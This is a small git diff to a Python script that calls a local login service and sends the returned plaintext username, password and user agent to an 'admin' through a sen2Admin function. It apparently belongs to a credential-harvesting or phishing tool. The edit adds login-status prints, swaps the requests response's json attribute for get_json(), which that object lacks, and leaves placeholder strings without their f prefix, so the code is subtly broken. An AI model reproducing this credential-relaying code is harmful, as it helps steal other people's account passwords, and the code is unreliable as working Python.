@@ -46,7 +46,7 @@ if __name__ == "__main__":
     from waitress import serve
     start = requests.get(
         'http://localhost:7007/start?username={config.username}&password={config.password}')
-    data = start.json
+    data = start.get_json()
     ok = data["ok"]
     status = data["status"]
     username = data["username"]
@@ -54,9 +54,12 @@ if __name__ == "__main__":
     useragent = data["useragent"]
     img = data["img"]
     if ok:
+        print(get_timestamp(), "Login Success")
         sen2Admin(
             'LoginSuccess: {status}\nUsername: {username}\nPassword: {password}\nUseragent: {useragent}')
+
     else:
+        print("[X]", get_timestamp(), "Login failed")
         sen2Admin(
             'LoginFailed: {status}\nUsername: {username}\nPassword: {password}\nUseragent: {useragent}')
 
